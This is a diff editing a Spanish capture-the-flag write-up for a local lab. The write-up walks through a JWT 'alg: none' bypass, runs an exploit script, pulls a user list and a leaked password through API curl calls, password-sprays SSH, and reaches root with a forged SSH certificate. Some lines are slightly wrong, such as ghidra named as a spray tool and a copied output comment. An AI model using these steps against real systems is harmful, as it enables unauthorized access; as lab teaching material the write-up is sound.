@@ -22,7 +22,7 @@ Si ese JWT tiene `alg: none` (PlainJWT), el verificador devuelve `null` para `si
 y el bloque `if (signedJWT != null)` salta la verificación de firma por completo.
 
 **Exploit script (`exploit_jwt.py`):**
-Presente en items/principal_script.py
+(Presente en items/principal_script.py)
 ```python
 #!/usr/bin/env python3
 import json, time, base64, requests, sys
@@ -69,22 +69,38 @@ print(f"[+] Token: {forged}")
 
 ```bash
 pip install jwcrypto requests
-python3 exploit_jwt.py http://localhost:8182
+python3 principal_script.py http://localhost:8182
 ```
 
 **Obtener credenciales SSH:**  
-Usa el token en el navegador (sessionStorage → `auth_token`) o con curl:
+a) Con el navegador (Application → Session storage → http://localhost:8182):
+Key: auth_token
+Value: token
+
+Accedemos a /dashboard, donde podemos ver que también tenemos disponible users (de aquí sacamos diccionario de usuarios) y Settings (encontramos encryptionKey)
+
+b) Con curl
+
+Diccionario de usuarios:
+```bash
+curl -H "Authorization: Bearer <TOKEN>" http://localhost:8182/api/users | python3 -m json.tool
+# → encryptionKey: D3pl0y_$$H_Now42!
+```
+Contraseña:
 ```bash
 curl -H "Authorization: Bearer <TOKEN>" http://localhost:8182/api/settings | python3 -m json.tool
 # → encryptionKey: D3pl0y_$$H_Now42!
 ```
 
 **Password spray en SSH:**
+
+Una vez tenemos un diccionario de posibles usuarios (items/users.txt) y una posible contraseña, usamos una herramienta como ghidra o nxc para llevar a cabo un password spray.
+Vemos que, por suerte, esa contraseña nos sirve para el usuario svc-deploy
+
 ```bash
-# La contraseña funciona para svc-deploy
 ssh svc-deploy@localhost -p 2222   # D3pl0y_$$H_Now42!
-cat ~/user.txt
 ```
+Podemos encontrar la flag de usuario en user.txt (/home/svc-deploy)
 
 ---
 
@@ -120,7 +136,7 @@ ssh-keygen -L -f /tmp/pwn-cert.pub
 # 6. Conectar como root
 ssh -i /tmp/pwn root@localhost
 
-# 7. Flag
+# 7. Flag root
 cat /root/root.txt
 ```
 
